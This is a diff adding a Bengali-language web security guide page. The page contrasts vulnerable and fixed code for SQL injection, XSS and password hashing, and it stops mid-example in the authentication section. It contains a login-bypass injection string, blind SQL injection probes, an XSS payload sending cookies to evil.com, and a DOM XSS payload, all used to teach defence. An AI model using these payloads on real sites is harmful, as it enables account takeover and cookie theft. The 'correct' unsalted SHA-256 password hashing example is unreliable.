@@ -1,0 +1,1822 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ওয়েব অ্যাপ্লিকেশন সিকিউরিটি গাইডলাইন</title>
+<link href="https://fonts.googleapis.com/css2?family=Tiro+Bangla:ital@0;1&family=Noto+Sans+Bengali:wght@300;400;600;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0e1a;
+  --surface: #0f1629;
+  --surface2: #141d35;
+  --surface3: #1a2540;
+  --border: #1e3060;
+  --accent: #00d4ff;
+  --accent2: #ff6b35;
+  --accent3: #7c3aed;
+  --green: #00ff88;
+  --red: #ff3b6b;
+  --yellow: #ffd700;
+  --text: #e8edf5;
+  --text-muted: #8899bb;
+  --text-dim: #4a5a80;
+  --code-bg: #060d1e;
+  --gradient1: linear-gradient(135deg, #00d4ff22, #7c3aed22);
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: 'Noto Sans Bengali', sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  line-height: 1.8;
+  overflow-x: hidden;
+}
+
+/* Animated background grid */
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background-image:
+    linear-gradient(rgba(0,212,255,0.03) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0,212,255,0.03) 1px, transparent 1px);
+  background-size: 50px 50px;
+  pointer-events: none;
+  z-index: 0;
+}
+
+/* ═══ NAVBAR ═══ */
+nav {
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  background: rgba(10,14,26,0.92);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  padding: 0 2rem;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  height: 64px;
+}
+
+.nav-logo {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  font-weight: 900;
+  font-size: 1.1rem;
+  color: var(--accent);
+  letter-spacing: -0.5px;
+}
+
+.nav-logo .shield {
+  width: 36px; height: 36px;
+  background: linear-gradient(135deg, var(--accent), var(--accent3));
+  border-radius: 8px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 1.2rem;
+}
+
+.nav-links {
+  display: flex;
+  gap: 0.25rem;
+  list-style: none;
+  flex-wrap: wrap;
+}
+
+.nav-links a {
+  color: var(--text-muted);
+  text-decoration: none;
+  font-size: 0.75rem;
+  padding: 6px 12px;
+  border-radius: 6px;
+  transition: all 0.2s;
+  white-space: nowrap;
+}
+.nav-links a:hover { background: var(--surface3); color: var(--accent); }
+
+/* ═══ HERO ═══ */
+.hero {
+  position: relative;
+  z-index: 1;
+  text-align: center;
+  padding: 80px 2rem 60px;
+  overflow: hidden;
+}
+
+.hero::after {
+  content: '';
+  position: absolute;
+  top: -50%;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 800px; height: 800px;
+  background: radial-gradient(ellipse, rgba(0,212,255,0.06) 0%, transparent 70%);
+  pointer-events: none;
+}
+
+.hero-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  background: rgba(0,212,255,0.08);
+  border: 1px solid rgba(0,212,255,0.2);
+  border-radius: 100px;
+  padding: 6px 16px;
+  font-size: 0.8rem;
+  color: var(--accent);
+  margin-bottom: 24px;
+  animation: fadeDown 0.6s ease;
+}
+
+.hero h1 {
+  font-family: 'Tiro Bangla', serif;
+  font-size: clamp(2rem, 5vw, 3.5rem);
+  font-weight: 400;
+  line-height: 1.25;
+  margin-bottom: 20px;
+  animation: fadeUp 0.8s ease;
+}
+
+.hero h1 span {
+  background: linear-gradient(135deg, var(--accent), var(--accent3));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+
+.hero p {
+  font-size: 1.05rem;
+  color: var(--text-muted);
+  max-width: 600px;
+  margin: 0 auto 40px;
+  animation: fadeUp 1s ease;
+}
+
+.hero-stats {
+  display: flex;
+  gap: 2rem;
+  justify-content: center;
+  flex-wrap: wrap;
+  animation: fadeUp 1.2s ease;
+}
+
+.stat-item {
+  text-align: center;
+}
+.stat-num { font-size: 2rem; font-weight: 900; color: var(--accent); }
+.stat-label { font-size: 0.75rem; color: var(--text-dim); }
+
+/* ═══ LAYOUT ═══ */
+.container {
+  max-width: 1100px;
+  margin: 0 auto;
+  padding: 0 1.5rem;
+  position: relative;
+  z-index: 1;
+}
+
+/* ═══ SECTION ═══ */
+.section {
+  padding: 60px 0;
+  border-bottom: 1px solid var(--border);
+}
+
+.section-header {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  margin-bottom: 40px;
+}
+
+.section-icon {
+  width: 48px; height: 48px;
+  border-radius: 12px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 1.4rem;
+  flex-shrink: 0;
+}
+
+.section-title {
+  font-family: 'Tiro Bangla', serif;
+  font-size: 1.6rem;
+  font-weight: 400;
+}
+
+.section-subtitle {
+  font-size: 0.85rem;
+  color: var(--text-muted);
+  margin-top: 4px;
+}
+
+/* ═══ SEVERITY BADGES ═══ */
+.badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 5px;
+  padding: 3px 10px;
+  border-radius: 100px;
+  font-size: 0.72rem;
+  font-weight: 700;
+  letter-spacing: 0.5px;
+}
+.badge.critical { background: rgba(255,59,107,0.15); color: var(--red); border: 1px solid rgba(255,59,107,0.3); }
+.badge.high { background: rgba(255,107,53,0.15); color: var(--accent2); border: 1px solid rgba(255,107,53,0.3); }
+.badge.medium { background: rgba(255,215,0,0.12); color: var(--yellow); border: 1px solid rgba(255,215,0,0.3); }
+.badge.low { background: rgba(0,255,136,0.12); color: var(--green); border: 1px solid rgba(0,255,136,0.3); }
+
+/* ═══ VULN CARD ═══ */
+.vuln-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  padding: 28px;
+  margin-bottom: 24px;
+  position: relative;
+  overflow: hidden;
+  transition: border-color 0.3s, transform 0.3s;
+}
+
+.vuln-card:hover {
+  border-color: var(--accent);
+  transform: translateY(-2px);
+}
+
+.vuln-card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 3px;
+}
+
+.vuln-card.critical::before { background: linear-gradient(90deg, var(--red), #ff8c42); }
+.vuln-card.high::before { background: linear-gradient(90deg, var(--accent2), #ffaa00); }
+.vuln-card.medium::before { background: linear-gradient(90deg, var(--yellow), #ff8c00); }
+.vuln-card.low::before { background: linear-gradient(90deg, var(--green), #00aaff); }
+
+.vuln-header {
+  display: flex;
+  align-items: flex-start;
+  justify-content: space-between;
+  gap: 12px;
+  margin-bottom: 16px;
+}
+
+.vuln-title {
+  font-size: 1.1rem;
+  font-weight: 700;
+  color: var(--text);
+}
+
+.vuln-desc {
+  color: var(--text-muted);
+  font-size: 0.9rem;
+  margin-bottom: 20px;
+}
+
+/* ═══ CODE BLOCKS ═══ */
+.code-pair {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 16px;
+  margin-top: 16px;
+}
+
+@media (max-width: 768px) {
+  .code-pair { grid-template-columns: 1fr; }
+}
+
+.code-block {
+  background: var(--code-bg);
+  border-radius: 10px;
+  overflow: hidden;
+  border: 1px solid var(--border);
+}
+
+.code-label {
+  padding: 8px 16px;
+  font-size: 0.72rem;
+  font-weight: 700;
+  letter-spacing: 1px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.code-label.bad { background: rgba(255,59,107,0.12); color: var(--red); border-bottom: 1px solid rgba(255,59,107,0.2); }
+.code-label.good { background: rgba(0,255,136,0.08); color: var(--green); border-bottom: 1px solid rgba(0,255,136,0.2); }
+
+.code-block pre {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.78rem;
+  line-height: 1.7;
+  padding: 16px;
+  overflow-x: auto;
+  color: #a8c4e0;
+}
+
+.code-block pre .kw { color: #ff79c6; }
+.code-block pre .str { color: #f1fa8c; }
+.code-block pre .fn { color: #50fa7b; }
+.code-block pre .comment { color: #6272a4; font-style: italic; }
+.code-block pre .var { color: #8be9fd; }
+.code-block pre .num { color: #bd93f9; }
+
+/* ═══ CHECKLIST ═══ */
+.checklist {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+  gap: 12px;
+  margin-top: 16px;
+}
+
+.check-item {
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+  padding: 12px 16px;
+  background: var(--surface2);
+  border-radius: 10px;
+  border: 1px solid var(--border);
+  font-size: 0.88rem;
+  transition: all 0.2s;
+  cursor: pointer;
+}
+
+.check-item:hover { border-color: var(--accent); background: var(--surface3); }
+
+.check-box {
+  width: 20px; height: 20px;
+  border: 2px solid var(--border);
+  border-radius: 5px;
+  flex-shrink: 0;
+  margin-top: 2px;
+  transition: all 0.2s;
+  display: flex; align-items: center; justify-content: center;
+  cursor: pointer;
+}
+
+.check-item.checked .check-box {
+  background: var(--green);
+  border-color: var(--green);
+  color: #000;
+  font-size: 0.7rem;
+}
+
+/* ═══ INFO BOXES ═══ */
+.info-box {
+  padding: 16px 20px;
+  border-radius: 10px;
+  margin: 16px 0;
+  border-left: 4px solid;
+  font-size: 0.9rem;
+}
+
+.info-box.warning { background: rgba(255,215,0,0.06); border-color: var(--yellow); }
+.info-box.danger { background: rgba(255,59,107,0.06); border-color: var(--red); }
+.info-box.tip { background: rgba(0,255,136,0.06); border-color: var(--green); }
+.info-box.info { background: rgba(0,212,255,0.06); border-color: var(--accent); }
+
+.info-box strong { display: block; margin-bottom: 6px; }
+.info-box.warning strong { color: var(--yellow); }
+.info-box.danger strong { color: var(--red); }
+.info-box.tip strong { color: var(--green); }
+.info-box.info strong { color: var(--accent); }
+
+/* ═══ TABLE ═══ */
+.table-wrap { overflow-x: auto; border-radius: 12px; border: 1px solid var(--border); }
+table { width: 100%; border-collapse: collapse; font-size: 0.88rem; }
+thead tr { background: var(--surface3); }
+th { padding: 12px 16px; text-align: left; color: var(--accent); font-weight: 700; font-size: 0.8rem; letter-spacing: 0.5px; border-bottom: 1px solid var(--border); }
+td { padding: 12px 16px; border-bottom: 1px solid rgba(30,48,96,0.5); color: var(--text-muted); }
+tr:hover td { background: var(--surface2); }
+tr:last-child td { border-bottom: none; }
+
+/* ═══ PROGRESS ═══ */
+.progress-section {
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  padding: 24px;
+  margin-bottom: 32px;
+}
+
+.progress-title {
+  font-size: 0.85rem;
+  color: var(--text-muted);
+  margin-bottom: 12px;
+}
+
+.progress-bar-wrap {
+  background: var(--surface3);
+  border-radius: 100px;
+  height: 8px;
+  overflow: hidden;
+  margin-bottom: 8px;
+}
+
+.progress-bar {
+  height: 100%;
+  border-radius: 100px;
+  background: linear-gradient(90deg, var(--accent), var(--accent3));
+  width: 0%;
+  transition: width 1s ease;
+}
+
+.progress-meta {
+  display: flex;
+  justify-content: space-between;
+  font-size: 0.78rem;
+  color: var(--text-dim);
+}
+
+/* ═══ TOC ═══ */
+.toc {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  padding: 28px;
+  margin-bottom: 48px;
+}
+
+.toc-title {
+  font-size: 0.75rem;
+  letter-spacing: 2px;
+  color: var(--accent);
+  margin-bottom: 16px;
+  font-weight: 700;
+}
+
+.toc-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+  gap: 8px;
+}
+
+.toc-link {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 10px 14px;
+  border-radius: 8px;
+  text-decoration: none;
+  color: var(--text-muted);
+  font-size: 0.85rem;
+  transition: all 0.2s;
+  border: 1px solid transparent;
+}
+
+.toc-link:hover {
+  background: var(--surface3);
+  border-color: var(--border);
+  color: var(--text);
+}
+
+.toc-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.7rem;
+  color: var(--accent);
+  min-width: 24px;
+}
+
+/* ═══ FOOTER ═══ */
+footer {
+  text-align: center;
+  padding: 40px 2rem;
+  color: var(--text-dim);
+  font-size: 0.82rem;
+  border-top: 1px solid var(--border);
+  position: relative;
+  z-index: 1;
+}
+
+/* ═══ ANIMATIONS ═══ */
+@keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+@keyframes fadeDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+
+.fade-in {
+  opacity: 0;
+  transform: translateY(16px);
+  transition: opacity 0.6s ease, transform 0.6s ease;
+}
+.fade-in.visible { opacity: 1; transform: translateY(0); }
+
+/* Scrollbar */
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: var(--accent); }
+
+/* Mobile nav */
+@media (max-width: 768px) {
+  .nav-links { display: none; }
+  .hero h1 { font-size: 1.8rem; }
+  .code-pair { grid-template-columns: 1fr; }
+}
+
+/* Tabs */
+.tabs { display: flex; gap: 4px; margin-bottom: 20px; flex-wrap: wrap; }
+.tab-btn {
+  padding: 8px 16px; border-radius: 8px; border: 1px solid var(--border);
+  background: transparent; color: var(--text-muted); cursor: pointer;
+  font-family: 'Noto Sans Bengali', sans-serif; font-size: 0.82rem;
+  transition: all 0.2s;
+}
+.tab-btn.active { background: var(--accent); color: #000; border-color: var(--accent); font-weight: 700; }
+.tab-content { display: none; }
+.tab-content.active { display: block; }
+
+/* Attack flow */
+.attack-flow {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 16px;
+  background: var(--code-bg);
+  border-radius: 10px;
+  overflow-x: auto;
+  margin: 16px 0;
+  flex-wrap: nowrap;
+}
+
+.flow-step {
+  flex-shrink: 0;
+  text-align: center;
+}
+.flow-icon {
+  width: 44px; height: 44px;
+  border-radius: 10px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 1.2rem;
+  margin: 0 auto 6px;
+}
+.flow-label { font-size: 0.7rem; color: var(--text-muted); white-space: nowrap; }
+.flow-arrow { color: var(--text-dim); font-size: 1.2rem; flex-shrink: 0; }
+</style>
+</head>
+<body>
+
+<!-- NAVBAR -->
+<nav>
+  <div class="nav-logo">
+    <div class="shield">🛡️</div>
+    ওয়েব সিকিউরিটি
+  </div>
+  <ul class="nav-links">
+    <li><a href="#injection">SQL ইনজেকশন</a></li>
+    <li><a href="#xss">XSS</a></li>
+    <li><a href="#auth">অথেন্টিকেশন</a></li>
+    <li><a href="#csrf">CSRF</a></li>
+    <li><a href="#headers">HTTP হেডার</a></li>
+    <li><a href="#api">API সিকিউরিটি</a></li>
+    <li><a href="#checklist">চেকলিস্ট</a></li>
+  </ul>
+</nav>
+
+<!-- HERO -->
+<header class="hero">
+  <div class="hero-badge">🔐 বাংলা ভাষায় সম্পূর্ণ গাইড</div>
+  <h1>ওয়েব অ্যাপ্লিকেশন<br><span>সিকিউরিটি গাইডলাইন</span></h1>
+  <p>SQL ইনজেকশন থেকে API সিকিউরিটি পর্যন্ত — বাস্তব উদাহরণসহ সম্পূর্ণ নিরাপত্তা গাইড।</p>
+  <div class="hero-stats">
+    <div class="stat-item">
+      <div class="stat-num">১০+</div>
+      <div class="stat-label">দুর্বলতার ধরন</div>
+    </div>
+    <div class="stat-item">
+      <div class="stat-num">৫০+</div>
+      <div class="stat-label">কোড উদাহরণ</div>
+    </div>
+    <div class="stat-item">
+      <div class="stat-num">১০০%</div>
+      <div class="stat-label">বাংলায়</div>
+    </div>
+  </div>
+</header>
+
+<div class="container">
+
+<!-- PROGRESS BAR -->
+<div class="progress-section fade-in">
+  <div class="progress-title">📊 আপনার সিকিউরিটি চেকলিস্ট অগ্রগতি</div>
+  <div class="progress-bar-wrap">
+    <div class="progress-bar" id="mainProgress"></div>
+  </div>
+  <div class="progress-meta">
+    <span id="progressText">০ টি সম্পন্ন</span>
+    <span id="progressPct">০%</span>
+  </div>
+</div>
+
+<!-- TABLE OF CONTENTS -->
+<div class="toc fade-in">
+  <div class="toc-title">বিষয়সূচি</div>
+  <div class="toc-grid">
+    <a href="#injection" class="toc-link"><span class="toc-num">০১</span> SQL ইনজেকশন</a>
+    <a href="#xss" class="toc-link"><span class="toc-num">০২</span> XSS অ্যাটাক</a>
+    <a href="#auth" class="toc-link"><span class="toc-num">০৩</span> অথেন্টিকেশন</a>
+    <a href="#csrf" class="toc-link"><span class="toc-num">০৪</span> CSRF সুরক্ষা</a>
+    <a href="#headers" class="toc-link"><span class="toc-num">০৫</span> HTTP সিকিউরিটি হেডার</a>
+    <a href="#api" class="toc-link"><span class="toc-num">০৬</span> API সিকিউরিটি</a>
+    <a href="#upload" class="toc-link"><span class="toc-num">০৭</span> ফাইল আপলোড</a>
+    <a href="#session" class="toc-link"><span class="toc-num">০৮</span> সেশন ম্যানেজমেন্ট</a>
+    <a href="#crypto" class="toc-link"><span class="toc-num">০৯</span> ক্রিপ্টোগ্রাফি</a>
+    <a href="#checklist" class="toc-link"><span class="toc-num">১০</span> সম্পূর্ণ চেকলিস্ট</a>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════ -->
+<!-- 01. SQL INJECTION -->
+<!-- ═══════════════════════════════════════════ -->
+<section class="section fade-in" id="injection">
+  <div class="section-header">
+    <div class="section-icon" style="background:rgba(255,59,107,0.15)">💉</div>
+    <div>
+      <div class="section-title">SQL ইনজেকশন</div>
+      <div class="section-subtitle">সবচেয়ে বিপজ্জনক ও প্রচলিত আক্রমণ পদ্ধতি</div>
+    </div>
+    <span class="badge critical">⚠ ক্রিটিকাল</span>
+  </div>
+
+  <div class="info-box danger">
+    <strong>🚨 কী হয়?</strong>
+    আক্রমণকারী ডেটাবেজ কোয়েরিতে ক্ষতিকর SQL কোড ইনজেক্ট করে সম্পূর্ণ ডেটাবেজ চুরি, পরিবর্তন বা মুছে ফেলতে পারে।
+  </div>
+
+  <!-- Attack flow -->
+  <div class="attack-flow">
+    <div class="flow-step"><div class="flow-icon" style="background:rgba(255,59,107,0.2)">👤</div><div class="flow-label">আক্রমণকারী</div></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step"><div class="flow-icon" style="background:rgba(255,107,53,0.2)">📝</div><div class="flow-label">ইনপুট ফিল্ড</div></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step"><div class="flow-icon" style="background:rgba(255,215,0,0.2)">⚙️</div><div class="flow-label">SQL কোয়েরি</div></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step"><div class="flow-icon" style="background:rgba(255,59,107,0.2)">🗄️</div><div class="flow-label">ডেটাবেজ</div></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step"><div class="flow-icon" style="background:rgba(255,59,107,0.2)">💀</div><div class="flow-label">ডেটা চুরি</div></div>
+  </div>
+
+  <div class="vuln-card critical">
+    <div class="vuln-header">
+      <div class="vuln-title">Classic SQL Injection</div>
+      <span class="badge critical">ক্রিটিকাল</span>
+    </div>
+    <div class="vuln-desc">লগইন ফর্মে <code style="color:var(--accent);background:var(--code-bg);padding:2px 6px;border-radius:4px">' OR '1'='1</code> টাইপ করলেই পাসওয়ার্ড ছাড়া লগইন।</div>
+
+    <div class="tabs">
+      <button class="tab-btn active" onclick="showTab(this, 'sql-php')">PHP</button>
+      <button class="tab-btn" onclick="showTab(this, 'sql-py')">Python</button>
+      <button class="tab-btn" onclick="showTab(this, 'sql-node')">Node.js</button>
+    </div>
+
+    <div class="tab-content active" id="sql-php">
+      <div class="code-pair">
+        <div class="code-block">
+          <div class="code-label bad">❌ ভুল পদ্ধতি (SQL Injection সম্ভব)</div>
+          <pre><span class="comment">// ইউজার ইনপুট সরাসরি কোয়েরিতে</span>
+<span class="var">$username</span> = <span class="var">$_POST</span>[<span class="str">'username'</span>];
+<span class="var">$password</span> = <span class="var">$_POST</span>[<span class="str">'password'</span>];
+
+<span class="var">$query</span> = <span class="str">"SELECT * FROM users 
+  WHERE username='$username' 
+  AND password='$password'"</span>;
+
+<span class="comment">// আক্রমণ: username = ' OR '1'='1
+// ফলে কোয়েরি হয়: WHERE username=''
+// OR '1'='1' -- সব ইউজার রিটার্ন!</span></pre>
+        </div>
+        <div class="code-block">
+          <div class="code-label good">✅ সঠিক পদ্ধতি (Prepared Statement)</div>
+          <pre><span class="comment">// Prepared Statement ব্যবহার করুন</span>
+<span class="var">$stmt</span> = <span class="var">$pdo</span>-><span class="fn">prepare</span>(
+  <span class="str">"SELECT * FROM users 
+   WHERE username = ? 
+   AND password = ?"</span>
+);
+
+<span class="var">$stmt</span>-><span class="fn">execute</span>([
+  <span class="var">$_POST</span>[<span class="str">'username'</span>],
+  <span class="fn">hash</span>(<span class="str">'sha256'</span>, <span class="var">$_POST</span>[<span class="str">'password'</span>])
+]);
+
+<span class="var">$user</span> = <span class="var">$stmt</span>-><span class="fn">fetch</span>();
+<span class="comment">// ✅ SQL কোড কখনো ইনজেক্ট হবে না!</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="tab-content" id="sql-py">
+      <div class="code-pair">
+        <div class="code-block">
+          <div class="code-label bad">❌ ভুল পদ্ধতি</div>
+          <pre><span class="kw">import</span> sqlite3
+
+<span class="kw">def</span> <span class="fn">login</span>(username, password):
+  conn = sqlite3.<span class="fn">connect</span>(<span class="str">'db.sqlite'</span>)
+  query = <span class="str">f"SELECT * FROM users 
+    WHERE user='{username}'"</span>
+  <span class="comment"># f-string = বিপদ!</span>
+  <span class="kw">return</span> conn.<span class="fn">execute</span>(query)</pre>
+        </div>
+        <div class="code-block">
+          <div class="code-label good">✅ সঠিক পদ্ধতি</div>
+          <pre><span class="kw">import</span> sqlite3
+
+<span class="kw">def</span> <span class="fn">login</span>(username, password):
+  conn = sqlite3.<span class="fn">connect</span>(<span class="str">'db.sqlite'</span>)
+  query = <span class="str">"SELECT * FROM users 
+    WHERE user=? AND pass=?"</span>
+  <span class="comment"># ? placeholder ব্যবহার করুন</span>
+  <span class="kw">return</span> conn.<span class="fn">execute</span>(
+    query, (username, password)
+  )</pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="tab-content" id="sql-node">
+      <div class="code-pair">
+        <div class="code-block">
+          <div class="code-label bad">❌ ভুল পদ্ধতি</div>
+          <pre><span class="comment">// Template literal = বিপদ</span>
+<span class="kw">const</span> query = <span class="str">`SELECT * FROM users 
+  WHERE email='${req.body.email}'`</span>;
+<span class="fn">db.query</span>(query, callback);</pre>
+        </div>
+        <div class="code-block">
+          <div class="code-label good">✅ সঠিক পদ্ধতি</div>
+          <pre><span class="comment">// Parameterized query</span>
+<span class="kw">const</span> query = <span class="str">'SELECT * FROM users 
+  WHERE email = ?'</span>;
+<span class="fn">db.query</span>(query, 
+  [req.body.email], 
+  callback
+);
+<span class="comment">// অথবা ORM (Sequelize/Prisma)</span></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="vuln-card high">
+    <div class="vuln-header">
+      <div class="vuln-title">Blind SQL Injection</div>
+      <span class="badge high">উচ্চ</span>
+    </div>
+    <div class="vuln-desc">এরর মেসেজ দেখা না গেলেও TRUE/FALSE রেসপন্স দেখে ডেটা বের করা সম্ভব।</div>
+    <div class="code-block">
+      <div class="code-label bad">❌ আক্রমণের উদাহরণ</div>
+      <pre><span class="comment">// আক্রমণকারী এইভাবে পরীক্ষা করে:</span>
+https://example.com/user?id=<span class="str">1 AND 1=1</span>  <span class="comment">→ স্বাভাবিক পেজ লোড</span>
+https://example.com/user?id=<span class="str">1 AND 1=2</span>  <span class="comment">→ ভিন্ন রেসপন্স = ব্লাইন্ড ইনজেকশন সম্ভব!</span>
+
+<span class="comment">// তারপর একে একে ডেটা বের করে:
+// 1 AND SUBSTRING(password,1,1)='a' → TRUE হলে পাসওয়ার্ড 'a' দিয়ে শুরু</span></pre>
+    </div>
+    <div class="info-box tip">
+      <strong>✅ সমাধান</strong>
+      সব ক্ষেত্রে Prepared Statement + WAF (Web Application Firewall) + ইনপুট ভ্যালিডেশন।
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════ -->
+<!-- 02. XSS -->
+<!-- ═══════════════════════════════════════════ -->
+<section class="section fade-in" id="xss">
+  <div class="section-header">
+    <div class="section-icon" style="background:rgba(255,107,53,0.15)">⚡</div>
+    <div>
+      <div class="section-title">Cross-Site Scripting (XSS)</div>
+      <div class="section-subtitle">ব্রাউজারে ক্ষতিকর স্ক্রিপ্ট ইনজেকশন</div>
+    </div>
+    <span class="badge high">উচ্চ ঝুঁকি</span>
+  </div>
+
+  <div class="info-box danger">
+    <strong>🚨 কী হয়?</strong>
+    আক্রমণকারী ওয়েবসাইটে JavaScript কোড ইনজেক্ট করে। এই কোড অন্য ইউজারের ব্রাউজারে চলে, কুকি চুরি করে, কীস্ট্রোক রেকর্ড করে।
+  </div>
+
+  <div class="vuln-card critical">
+    <div class="vuln-header">
+      <div class="vuln-title">Stored XSS (সংরক্ষিত XSS)</div>
+      <span class="badge critical">ক্রিটিকাল</span>
+    </div>
+    <div class="vuln-desc">ডেটাবেজে স্ক্রিপ্ট সেভ হয়, প্রতিটি ইউজার পেজ লোড করলেই কোড চলে।</div>
+    <div class="code-pair">
+      <div class="code-block">
+        <div class="code-label bad">❌ বিপজ্জনক</div>
+        <pre><span class="comment">// কমেন্ট বক্সে আক্রমণকারী লিখল:</span>
+<span class="str">&lt;script&gt;
+  document.location=
+  'https://evil.com/steal?c='
+  +document.cookie
+&lt;/script&gt;</span>
+
+<span class="comment">// PHP তে সরাসরি ইকো করলে:</span>
+<span class="kw">echo</span> <span class="var">$comment</span>; <span class="comment">// বিপদ!</span></pre>
+      </div>
+      <div class="code-block">
+        <div class="code-label good">✅ নিরাপদ</div>
+        <pre><span class="comment">// PHP: htmlspecialchars ব্যবহার</span>
+<span class="kw">echo</span> <span class="fn">htmlspecialchars</span>(
+  <span class="var">$comment</span>, 
+  ENT_QUOTES, 
+  <span class="str">'UTF-8'</span>
+);
+
+<span class="comment">// JavaScript: textContent ব্যবহার</span>
+element.textContent = userInput;
+<span class="comment">// innerHTML নয়! textContent!</span>
+
+<span class="comment">// React: স্বয়ংক্রিয়ভাবে escape করে</span>
+<span class="kw">return</span> &lt;div&gt;{userInput}&lt;/div&gt;</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="vuln-card high">
+    <div class="vuln-header">
+      <div class="vuln-title">DOM-based XSS</div>
+      <span class="badge high">উচ্চ</span>
+    </div>
+    <div class="vuln-desc">URL parameter থেকে সরাসরি DOM-এ ডেটা লেখার কারণে হয়।</div>
+    <div class="code-pair">
+      <div class="code-block">
+        <div class="code-label bad">❌ বিপজ্জনক</div>
+        <pre><span class="comment">// URL: ?name=&lt;img onerror=alert(1)&gt;</span>
+<span class="kw">const</span> name = <span class="kw">new</span> <span class="fn">URLSearchParams</span>(
+  location.search
+).<span class="fn">get</span>(<span class="str">'name'</span>);
+
+<span class="comment">// innerHTML = বিপদ!</span>
+document.<span class="fn">getElementById</span>(<span class="str">'greeting'</span>)
+  .innerHTML = <span class="str">`হ্যালো ${name}`</span>;</pre>
+      </div>
+      <div class="code-block">
+        <div class="code-label good">✅ নিরাপদ</div>
+        <pre><span class="kw">const</span> name = <span class="kw">new</span> <span class="fn">URLSearchParams</span>(
+  location.search
+).<span class="fn">get</span>(<span class="str">'name'</span>);
+
+<span class="comment">// textContent ব্যবহার করুন</span>
+document.<span class="fn">getElementById</span>(<span class="str">'greeting'</span>)
+  .textContent = <span class="str">`হ্যালো ${name}`</span>;
+
+<span class="comment">// অথবা DOMPurify লাইব্রেরি:</span>
+<span class="fn">DOMPurify</span>.<span class="fn">sanitize</span>(dirtyHTML);</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="info-box info">
+    <strong>💡 Content Security Policy (CSP)</strong>
+    HTTP হেডারে CSP সেট করলে inline script এবং অননুমোদিত সোর্স থেকে স্ক্রিপ্ট ব্লক হয়।
+    <br><br>
+    <code style="font-family:'JetBrains Mono',monospace;font-size:0.8rem;color:var(--accent)">Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'</code>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════ -->
+<!-- 03. AUTHENTICATION -->
+<!-- ═══════════════════════════════════════════ -->
+<section class="section fade-in" id="auth">
+  <div class="section-header">
+    <div class="section-icon" style="background:rgba(124,58,237,0.15)">🔑</div>
+    <div>
+      <div class="section-title">অথেন্টিকেশন সিকিউরিটি</div>
+      <div class="section-subtitle">পাসওয়ার্ড ও লগইন সিস্টেম সুরক্ষা</div>
+    </div>
+    <span class="badge critical">ক্রিটিকাল</span>
+  </div>
+
+  <div class="vuln-card critical">
+    <div class="vuln-header">
+      <div class="vuln-title">পাসওয়ার্ড হ্যাশিং</div>
+      <span class="badge critical">ক্রিটিকাল</span>
+    </div>
+    <div class="vuln-desc">পাসওয়ার্ড কখনো প্লেইন টেক্সটে বা MD5/SHA1-এ সংরক্ষণ করবেন না।</div>
+
+    <div class="tabs">
+      <button class="tab-btn active" onclick="showTab(this, 'hash-php')">PHP</button>
+      <button class="tab-btn" onclick="showTab(this, 'hash-py')">Python</button>
+      <button class="tab-btn" onclick="showTab(this, 'hash-node')">Node.js</button>
+    </div>
+
+    <div class="tab-content active" id="hash-php">
+      <div class="code-pair">
+        <div class="code-block">
+          <div class="code-label bad">❌ ভুল পদ্ধতি</div>
+          <pre><span class="comment">// এগুলো কখনো করবেন না:</span>
+<span class="var">$pass</span> = <span class="var">$_POST</span>[<span class="str">'password'</span>];
+<span class="comment">// প্লেইন টেক্সট সংরক্ষণ:</span>
+<span class="var">$save</span> = <span class="var">$pass</span>;
+
